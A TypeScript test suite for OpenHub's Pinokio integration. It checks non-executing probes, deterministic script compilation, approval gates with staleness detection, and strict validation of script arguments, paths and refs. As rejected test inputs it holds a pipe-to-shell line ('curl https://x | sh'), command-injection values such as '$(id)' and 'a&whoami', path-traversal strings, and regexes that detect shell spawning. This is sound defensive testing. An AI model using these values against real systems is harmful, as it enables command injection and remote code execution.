import { mkdir, mkdtemp, readFile, readdir, realpath, rm, stat, writeFile } from "node:fs/promises";
import { readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it, vi } from "vitest";
import {
  PINOKIO_APPROVAL_REQUIREMENTS,
  PINOKIO_SCRIPT_ARG_KEYS,
  buildPinokioPlan,
  compilePinokioScripts,
  fetchThirdPartyScript,
  parseScriptArgs,
  pinokioAppId,
  pinokioRef,
  planPinokio,
  previewThirdPartyScript,
  probePinokio,
  ptermInvocation,
  readPinokioTemplate,
  requestPinokioApproval,
  serializePinokioPlan,
  spawnPterm,
  validateArgValue,
  validateScriptPath,
  verifyApprovedPlan,
  verifyPinokioApproval,
  type ExecSpawner,
  type Manifest,
  type PinokioApprovalRequirement,
  type PinokioPlanFacts,
  type PinokioPlanRequest,
  type PinokioProbeEnv,
  type PlannedPinokio,
} from "../../src/index";
import { COMMIT, COMMIT2, WIN, newHome, pinokioManifest, pinokiod, ptermLayout, realFs, scratch } from "./helpers";

/** TASK-052 Pinokio 비실행 probe·제한 Compiler·PinokioPlan v1. 가짜 pinokiod(fetch)와 임시 폴더만 쓴다. 실제 프로세스 실행 없음. */
const SRC = path.resolve(import.meta.dirname, "../../src");
const FACTS: PinokioPlanFacts = { versions: { pterm: "0.0.25", pinokiod: "4.0.3", script: "4.0" }, appState: { exists: false, digest: "sha256:" + "0".repeat(64) }, installed: null };
const plannedOf = (r: ReturnType<typeof buildPinokioPlan> | Awaited<ReturnType<typeof planPinokio>>): PlannedPinokio => {
  if (!r.ok) throw new Error(r.code + " " + r.message);
  return r.planned;
};
const approve = async (p: PlannedPinokio, skip: readonly PinokioApprovalRequirement[] = []) => {
  const out = await requestPinokioApproval(p, { channel: "cli-tty", confirm: async (req) => req.requirements.map((r) => r.id).filter((id) => !skip.includes(id)) });
  if (out.status !== "approved") throw new Error(out.status);
  return out.approval;
};
const request = (over: Partial<PinokioPlanRequest> = {}): PinokioPlanRequest => ({ operation: "install", manifest: pinokioManifest(), ...over });
const stripComments = (s: string) => s.replace(/\/\*[\s\S]*?\*\//gu, "").replace(/^\s*\/\/.*$/gmu, "");

describe("REQ-032 Pinokio probe·Compiler·PinokioPlan", () => {
  it("AC-052-01 availability는 PATH launcher와 /pinokio/version 응답만으로 판단하고 실행 0회, pterm 버전은 package.json, index.js realpath escape는 거부한다", async () => {
    const layout = await ptermLayout();
    const home = await newHome();
    const d = pinokiod(home);
    const env: PinokioProbeEnv = { pathEnv: layout.pathEnv, platform: process.platform, fs: realFs(), fetch: d.fetch };
    const ok = await probePinokio(env);
    expect([ok.status, ok.available, ok.versions]).toEqual(["ok", true, { pterm: "0.0.25", pinokiod: "4.0.3", script: "4.0" }]);
    expect(ok.entry?.indexJs).toBe(await realpath(path.join(layout.pkgDir, "index.js")));
    expect(path.basename(ok.entry!.node)).toBe(WIN ? "node.exe" : "node");
    expect(d.calls).toEqual(["http://127.0.0.1:42000/pinokio/version"]);
    // index.js가 package 밖으로 해석되면 거부한다.
    const escaped = { ...realFs(), realpath: async (f: string) => (f.endsWith("index.js") ? path.join(scratch, "outside", "index.js") : realpath(f)) };
    expect((await probePinokio({ ...env, fs: escaped })).status).toBe("pterm-invalid");
    expect((await probePinokio({ ...env, pathEnv: path.join(scratch, "nowhere") })).status).toBe("pterm-not-found");
    expect((await probePinokio({ ...env, fetch: vi.fn(async () => Promise.reject(new TypeError("refused"))) })).status).toBe("pinokiod-unreachable");
    expect((await probePinokio({ ...env, pathEnv: (await ptermLayout("0.0.25", { pkg: { name: "not-pterm" } })).pathEnv })).status).toBe("pterm-invalid");
    for (const file of ["pinokio/probe.ts", "pinokio/http.ts"]) {
      const code = stripComments(readFileSync(path.join(SRC, file), "utf8"));
      expect(code, file).not.toMatch(/child_process|spawn|exec\(|spawner/u);
    }
  });

  it("AC-052-02 Compiler는 허용 template만 만들고 같은 Manifest면 생성 script byte가 같다(module.exports = <JSON>;, 코드 없음)", () => {
    const spec = readPinokioTemplate(pinokioManifest());
    const again = readPinokioTemplate(pinokioManifest());
    if (!spec.ok || !again.ok) throw new Error("template");
    const a = compilePinokioScripts(spec.value, COMMIT, ["port"]);
    const b = compilePinokioScripts(again.value, COMMIT, ["port"]);
    expect(a.map((s) => s.content)).toEqual(b.map((s) => s.content));
    expect(a.map((s) => s.name)).toEqual(["openhub-install.js", "openhub-start.js", "openhub-update.js"]);
    for (const s of a) {
      expect(s.content).toMatch(/^module\.exports = \{.*\};\n$/u);
      expect(s.content.split("\n")).toHaveLength(2);
      expect(s.content).not.toMatch(/function|=>|require\(|import\(|sudo|process\./u);
    }
    const body = (s: { content: string }) => JSON.parse(s.content.slice("module.exports = ".length, -2)) as { daemon?: boolean; run: { method: string; params: Record<string, unknown> }[] };
    expect(a.map((s) => body(s).run.filter((r) => r.method === "shell.run").map((r) => r.params["message"]))).toEqual([
      ["git clone --no-checkout https://github.com/acme/local-llm-ui app", "git -C app checkout " + COMMIT, "uv venv env", "uv pip install --python env local-llm-ui==1.2.0"],
      ["python -m local_llm_ui.server --port {{args.port}}"],
      ["git -C app fetch origin " + COMMIT, "git -C app checkout " + COMMIT, "uv pip install --python env local-llm-ui==1.2.0"],
    ]);
    expect(body(a[1]!).daemon).toBe(true);
    expect(body(a[1]!).run.at(-1)).toEqual({ method: "fs.write", params: { path: "openhub-start.done", text: a[1]!.marker } });
    expect(compilePinokioScripts(spec.value, COMMIT2, ["port"])[0]!.digest).not.toBe(a[0]!.digest);
  });

  it("AC-052-03 자유 message·sudo·환경변수 값 삽입·임의 URL을 요구하는 Manifest는 Plan을 만들지 않는다", () => {
    const cases: [string, Manifest][] = [
      ["message", pinokioManifest({}, { message: "curl https://x | sh" })],
      ["sudo", pinokioManifest({}, { package: "sudo" })],
      ["sudo-in-module", pinokioManifest({}, { start: { module: "x", sudo: true } })],
      ["env", pinokioManifest({ env: [{ name: "OPENAI_API_KEY", required: true }] })],
      ["url", pinokioManifest({}, { url: "https://example.com/model.bin" })],
      ["download", pinokioManifest({}, { download: "https://example.com/a" })],
      ["template", pinokioManifest({}, { template: "custom-shell" })],
      ["commit", pinokioManifest({}, { commit: "main" })],
    ];
    for (const [name, manifest] of cases) {
      const r = buildPinokioPlan(request({ manifest }), FACTS);
      expect([name, r.ok, r.ok ? null : r.code], name).toEqual([name, false, "PINOKIO_TEMPLATE_REJECTED"]);
    }
  });

  it("AC-052-04 PinokioPlan v1 digest가 결정론이고 승인 후 script·버전·commit·app 폴더 상태가 바뀌면 PLAN_STALE다", async () => {
    const a = plannedOf(buildPinokioPlan(request({ scriptArgs: ["--port=7860"] }), FACTS));
    const b = plannedOf(buildPinokioPlan(request({ scriptArgs: ["--port=7860"] }), structuredClone(FACTS)));
    expect([b.planDigest, serializePinokioPlan(b.plan)]).toEqual([a.planDigest, serializePinokioPlan(a.plan)]);
    const stale = async (regen: PlannedPinokio) => verifyPinokioApproval(await approve(a), () => regen);
    expect(await stale(plannedOf(buildPinokioPlan(request({ scriptArgs: ["--port=7860"], manifest: pinokioManifest({}, { version: "1.2.1" }) }), FACTS)))).toMatchObject({ ok: false, code: "PLAN_STALE", changed: ["scripts"] });
    expect(await stale(plannedOf(buildPinokioPlan(request({ scriptArgs: ["--port=7860"] }), { ...FACTS, versions: { ...FACTS.versions, pinokiod: "4.1.0" } })))).toMatchObject({ ok: false, code: "PLAN_STALE", changed: ["versions"] });
    expect(await stale(plannedOf(buildPinokioPlan(request({ scriptArgs: ["--port=7860"], targetCommit: COMMIT2 }), FACTS)))).toMatchObject({ ok: false, code: "PLAN_STALE", changed: ["commit", "scripts"] });
    expect((await verifyPinokioApproval(await approve(a), () => b)).ok).toBe(true);
    // 실제 app 폴더: 승인 뒤 폴더의 OpenHub 파일이 바뀌면 PLAN_STALE(app-state)이다.
    const layout = await ptermLayout();
    const home = await newHome();
    const deps = { probe: { pathEnv: layout.pathEnv, platform: process.platform, fs: realFs(), fetch: pinokiod(home).fetch } };
    await mkdir(path.join(home, "api", "openhub-local-llm-ui"), { recursive: true });
    const first = plannedOf(await planPinokio(request(), deps));
    const approval = await approve(first);
    await writeFile(path.join(home, "api", "openhub-local-llm-ui", "openhub-start.js"), "module.exports = {};\n");
    const regen = await planPinokio(request(), deps);
    expect(await verifyPinokioApproval(approval, () => plannedOf(regen))).toMatchObject({ ok: false, code: "PLAN_STALE", changed: ["app-state"] });
  });

  it("AC-052-05 승인 요구가 base·pinokio-delegated-shell·health-execution(+user scope·rollback)과 정확히 같고 공통 kernel로만 승인된다", async () => {
    const base = plannedOf(buildPinokioPlan(request(), FACTS));
    expect(base.plan.approvalRequirements).toEqual(["base", "pinokio-delegated-shell", "health-execution"]);
    const user = plannedOf(buildPinokioPlan(request({ configTargets: [{ client: "cursor", scope: "user" }, { client: "claude-code", scope: "project" }] }), FACTS));
    expect(user.plan.approvalRequirements).toEqual(["base", "pinokio-delegated-shell", "health-execution", "user-scope-config"]);
    expect(user.plan.configTargets.map((t) => [t.client, t.scope, t.mode, t.entry])).toEqual([
      ["claude-code", "project", "write", { type: "http", url: "http://127.0.0.1:7860/mcp" }],
      ["cursor", "user", "write", { url: "http://127.0.0.1:7860/mcp" }],
    ]);
    const codex = plannedOf(buildPinokioPlan(request({ configTargets: [{ client: "codex", scope: "project" }] }), FACTS));
    expect([codex.plan.configTargets[0]!.mode, codex.plan.approvalRequirements]).toEqual(["manual-setup-required", ["base", "pinokio-delegated-shell", "health-execution"]]);
    const installed = { commit: COMMIT2, previousCommit: COMMIT };
    const rollback = plannedOf(buildPinokioPlan(request({ operation: "rollback" }), { ...FACTS, installed }));
    expect(rollback.plan.approvalRequirements).toEqual(["base", "pinokio-delegated-shell", "health-execution", "rollback-to-previous"]);
    expect([rollback.plan.commit, rollback.plan.previousCommit, rollback.plan.run.script]).toEqual([COMMIT, COMMIT2, "openhub-update.js"]);
    // 요구를 빠뜨리면 실행할 수 없고, 다른 종류의 Approval·VerifiedPlan은 서로의 gate를 통과하지 못한다.
    expect(await verifyPinokioApproval(await approve(base, ["health-execution"]), () => base)).toMatchObject({ ok: false, code: "APPROVAL_INCOMPLETE", missing: ["health-execution"] });
    const pinokioApproval = await approve(base);
    expect(await verifyApprovedPlan(pinokioApproval as never, () => Promise.reject(new Error("unused")))).toMatchObject({ ok: false, code: "APPROVAL_REQUIRED" });
    expect(await verifyPinokioApproval({ planDigest: base.planDigest, acknowledgements: ["base", "pinokio-delegated-shell", "health-execution"], channel: "cli-tty" }, () => base)).toMatchObject({ ok: false, code: "APPROVAL_REQUIRED" });
    const upToDate = plannedOf(buildPinokioPlan(request({ operation: "update", targetCommit: COMMIT2 }), { ...FACTS, installed }));
    expect(upToDate.plan.status).toBe("up-to-date");
    expect(await requestPinokioApproval(upToDate, { channel: "cli-tty", confirm: async () => ["base"] })).toMatchObject({ status: "not-approvable", code: "PLAN_NOT_EXECUTABLE" });
  });

  it("AC-052-06 제3자 script는 고정 원문 Preview와 static warning만 만들고 실행 API·third-party-script 승인·spawn이 0이다", async () => {
    const content = ["module.exports = async (kernel) => ({", "  run: [{ method: \"shell.run\", params: { message: \"sudo apt install -y ffmpeg\" } },", "  { method: \"shell.run\", params: { message: \"/usr/local/bin/tool --x C:\\\\models\" } }]", "})"].join("\n");
    const r = previewThirdPartyScript({ repo: "someone/pinokio-app", commit: COMMIT, path: "install.js", content });
    if (!r.ok) throw new Error(r.message);
    expect(r.preview).toMatchObject({ kind: "third-party-pinokio-script", repo: "someone/pinokio-app", commit: COMMIT, content, executable: false });
    expect(r.preview.warnings).toEqual([
      { code: "dynamic-js", line: 1 },
      { code: "sudo", line: 2 },
      { code: "shell", line: 2 },
      { code: "shell", line: 3 },
      { code: "absolute-path", line: 3 },
    ]);
    expect(previewThirdPartyScript({ repo: "someone/pinokio-app", commit: "main", path: "install.js", content })).toMatchObject({ ok: false, code: "THIRD_PARTY_INPUT_INVALID" });
    expect(previewThirdPartyScript({ repo: "someone/pinokio-app", commit: COMMIT, path: "../install.js", content })).toMatchObject({ ok: false, code: "THIRD_PARTY_INPUT_INVALID" });
    const calls: string[] = [];
    const fetched = await fetchThirdPartyScript({ repo: "someone/pinokio-app", commit: COMMIT, path: "install.js" }, { fetch: async (url: string) => (calls.push(url), new Response(content, { status: 200 })) });
    expect(fetched).toMatchObject({ ok: true, preview: { content, executable: false } });
    expect(calls).toEqual(["https://api.github.com/repos/someone/pinokio-app/contents/install.js?ref=" + COMMIT]);
    expect(PINOKIO_APPROVAL_REQUIREMENTS as readonly string[]).not.toContain("third-party-script");
    const code = stripComments(readFileSync(path.join(SRC, "pinokio/third-party.ts"), "utf8"));
    expect(code).not.toMatch(/node:child_[p]rocess|spawn\(|pterm|Spawner|executeWith|verifyPinokio|process\/pterm/u);
  });

  it("AC-052-07 pterm ≠ 0.0.25, pinokiod·script 버전이 표 밖, 원격·동적 Health는 unsupported다", async () => {
    const home = await newHome();
    const old = await ptermLayout("0.0.24");
    expect((await probePinokio({ pathEnv: old.pathEnv, platform: process.platform, fs: realFs(), fetch: pinokiod(home).fetch })).status).toBe("pterm-version-unsupported");
    expect(await planPinokio(request(), { probe: { pathEnv: old.pathEnv, platform: process.platform, fs: realFs(), fetch: pinokiod(home).fetch } })).toMatchObject({ ok: false, code: "PINOKIO_VERSION_UNSUPPORTED" });
    const cur = await ptermLayout();
    expect(await planPinokio(request(), { probe: { pathEnv: cur.pathEnv, platform: process.platform, fs: realFs(), fetch: pinokiod(home, { pinokiod: "9.0.0", script: "4.0" }).fetch } })).toMatchObject({ ok: false, code: "PINOKIO_VERSION_UNSUPPORTED" });
    expect(buildPinokioPlan(request(), { ...FACTS, versions: { pterm: "0.0.25", pinokiod: "4.0.3", script: "1.0" } })).toMatchObject({ ok: false, code: "PINOKIO_VERSION_UNSUPPORTED" });
    for (const healthCheck of [{ type: "http" as const, url: "http://example.com:7860/" }, { type: "http" as const, url: "http://127.0.0.1/health" }, { type: "http" as const, url: "https://127.0.0.1:7860/" }, { type: "mcp-handshake" as const }]) {
      expect(buildPinokioPlan(request({ manifest: pinokioManifest({ healthCheck }) }), FACTS), JSON.stringify(healthCheck)).toMatchObject({ ok: false, code: "PINOKIO_HEALTH_UNSUPPORTED" });
    }
  });

  it("AC-052-08 spawner 기록에 shell·script 실행이 0건이고 pterm 호출은 node <index.js> start|stop <생성 script> --ref <고정 ref>뿐이다", async () => {
    const layout = await ptermLayout();
    const home = await newHome();
    const deps = { probe: { pathEnv: layout.pathEnv, platform: process.platform, fs: realFs(), fetch: pinokiod(home).fetch } };
    const req = request({ scriptArgs: ["--port=7860", "--name=safe-model"] });
    const result = await planPinokio(req, deps);
    if (!result.ok) throw new Error(result.code);
    const gate = await verifyPinokioApproval(await approve(result.planned), async () => plannedOf(await planPinokio(req, deps)));
    if (!gate.ok) throw new Error(gate.code);
    const calls: { executable: string; args: readonly string[]; options: unknown }[] = [];
    const spawner: ExecSpawner = (executable, args, options) => {
      calls.push({ executable, args, options });
      const listeners: Record<string, ((...a: unknown[]) => void)[]> = {};
      setTimeout(() => (listeners["close"] ?? []).forEach((l) => l(0, null)), 0);
      return { stdout: null, stderr: null, on: (e: string, l: (...a: unknown[]) => void) => ((listeners[e] ??= []).push(l), undefined), kill: () => true } as never;
    };
    for (const [verb, script] of [["start", "openhub-install.js"], ["start", "openhub-start.js"], ["stop", "openhub-start.js"]] as const) {
      await spawnPterm(ptermInvocation(gate.verified, result.entry, verb, script), { cwd: scratch, spawner }).exited;
    }
    const ref = "pinokio://127.0.0.1:42000/api/openhub-local-llm-ui";
    const index = await realpath(path.join(layout.pkgDir, "index.js"));
    const node = WIN ? "node.exe" : "node";
    expect(calls.map((c) => [path.basename(c.executable), ...c.args])).toEqual([
      [node, index, "start", "openhub-install.js", "--ref", ref],
      [node, index, "start", "openhub-start.js", "--ref", ref, "--", "--name=safe-model", "--port=7860"],
      [node, index, "stop", "openhub-start.js", "--ref", ref],
    ]);
    for (const c of calls) {
      expect(c.options).toMatchObject({ shell: false, stdio: ["ignore", "pipe", "pipe"] });
      expect(path.basename(c.executable)).not.toMatch(/^(?:cmd|sh|bash|pwsh|powershell)(?:\.exe)?$|\.(?:cmd|bat|ps1)$/iu);
      expect(c.args).not.toContain("run");
      expect(c.args).not.toContain("--default");
    }
    expect(() => ptermInvocation(gate.verified, result.entry, "run" as never, "openhub-start.js")).toThrow();
    expect(() => ptermInvocation(gate.verified, { ...result.entry, node: "C:\\Windows\\System32\\cmd.exe" }, "start", "openhub-start.js")).toThrow();
    expect(() => ptermInvocation(result.planned as never, result.entry, "start", "openhub-start.js")).toThrow("APPROVAL_REQUIRED");
    const sources = [...(await readdir(path.join(SRC, "pinokio"))).map((f) => "pinokio/" + f), "process/pterm.ts"];
    for (const f of sources) expect(stripComments(readFileSync(path.join(SRC, f), "utf8")), f).not.toMatch(/"--default"|shell:\s*true|cmd\.exe"/u);
  });

  const rejectedWithoutIo = async (req: PinokioPlanRequest) => {
    const fetch = vi.fn(async () => new Response("{}"));
    const log: string[] = [];
    const r = await planPinokio(req, { probe: { pathEnv: "", platform: process.platform, fs: realFs(log), fetch } });
    expect(r.ok).toBe(false);
    expect(fetch).not.toHaveBeenCalled();
    expect(log).toEqual([]);
    return r.ok ? null : r.code;
  };

  it("AC-052-09 script 인자 value는 strict 검증을 통과해야 하고 거부하면 Plan·pterm 실행·파일 쓰기가 0회다", async () => {
    expect(parseScriptArgs("openhub-start.js", ["--port=3000", "--name=safe-model"])).toEqual({ ok: true, value: [{ key: "name", value: "safe-model" }, { key: "port", value: "3000" }] });
    for (const bad of ["--name=%COMSPEC%", "--name=!PATH!", "--name=^&", "--name=a&whoami", "--name=a;b", "--name=a|b", "--name=$(id)", "--name=`id`", "--name=a b", "--name=a\nb", "--name=/etc/passwd", "--name=C:\\x", "--name=..", "--name=a/../b", "--name='x'", '--name="x"', "--name={x}", "--name=", "--port=99999", "--port=abc", "port=1", "-port=1"]) {
      expect(parseScriptArgs("openhub-start.js", [bad]).ok, JSON.stringify(bad)).toBe(false);
      expect(await rejectedWithoutIo(request({ scriptArgs: [bad] })), bad).toBe("PINOKIO_ARGS_REJECTED");
    }
    expect([validateArgValue("safe-model"), validateArgValue("model_v1.2"), validateArgValue("%PATH%"), validateArgValue("a^b"), validateArgValue("x!")]).toEqual([true, true, false, false, false]);
  });

  it("AC-052-10 script 인자 key는 형식 regex와 template 선언 목록을 모두 통과해야 하고 거부하면 Plan·실행·쓰기가 0회다", async () => {
    expect(PINOKIO_SCRIPT_ARG_KEYS["openhub-start.js"]).toEqual(["name", "port"]);
    expect(parseScriptArgs("openhub-start.js", ["--port=3000"]).ok).toBe(true);
    for (const bad of [["--unknown=1"], ["--=1"], ["--port=1", "--port=2"], ["--__proto__=x"], ["--constructor=x"], ["--prototype=x"], ["--a.b=1"], ["--a[0]=1"], ["--po rt=1"], ["--Port=1"], ["--port.x=1"]]) {
      expect(parseScriptArgs("openhub-start.js", bad).ok, bad.join(" ")).toBe(false);
      expect(await rejectedWithoutIo(request({ scriptArgs: bad })), bad.join(" ")).toBe("PINOKIO_ARGS_REJECTED");
    }
    // install·update template은 선언 key가 없으므로 어떤 인자도 받지 않는다.
    expect(parseScriptArgs("openhub-install.js", ["--port=3000"]).ok).toBe(false);
    expect(await rejectedWithoutIo(request({ scriptPath: "openhub-install.js", scriptArgs: ["--port=7860"] }))).toBe("PINOKIO_ARGS_REJECTED");
    expect((Object.prototype as Record<string, unknown>)["polluted"]).toBeUndefined();
  });

  it("AC-052-11 script_path는 세 이름만, ref는 항상 OpenHub가 만든 고정값이며 traversal app-id는 거부되고 Plan·실행·쓰기가 0회다", async () => {
    for (const ok of ["openhub-install.js", "openhub-start.js", "openhub-update.js"]) expect(validateScriptPath(ok).ok).toBe(true);
    for (const bad of ["/abs/x.js", "C:\\x.js", "../x.js", "sub/x.js", "sub\\x.js", "start.js?a=1", "openhub-start.js?a=1", "openhub-start.js#f", "https://h/x.js", "my-start.js", "./openhub-start.js", "OPENHUB-START.JS"]) {
      expect(validateScriptPath(bad).ok, bad).toBe(false);
      expect(await rejectedWithoutIo(request({ operation: "health", scriptPath: bad })), bad).toBe("PINOKIO_SCRIPT_PATH_REJECTED");
    }
    expect(pinokioRef("local-llm-ui")).toEqual({ ok: true, value: "pinokio://127.0.0.1:42000/api/openhub-local-llm-ui" });
    for (const id of ["a/b", "a\\b", "..", "a..b", "a%2e%2e", "a%2fb", "a%5cb", "a?b", "a#b", "a b", "%2e%2e%2f"]) expect(pinokioAppId(id).ok, id).toBe(false);
    expect(await rejectedWithoutIo(request({ manifest: { ...pinokioManifest(), name: "a..b" } }))).toBe("PINOKIO_REF_REJECTED");
    const p = plannedOf(buildPinokioPlan(request({ ref: "pinokio://evil.example:1/other/../../x" }), FACTS));
    expect([p.plan.ref, p.plan.appRef]).toEqual(["pinokio://127.0.0.1:42000/api/openhub-local-llm-ui", "api/openhub-local-llm-ui"]);
    expect(plannedOf(buildPinokioPlan(request(), FACTS)).planDigest).toBe(p.planDigest);
  });
});

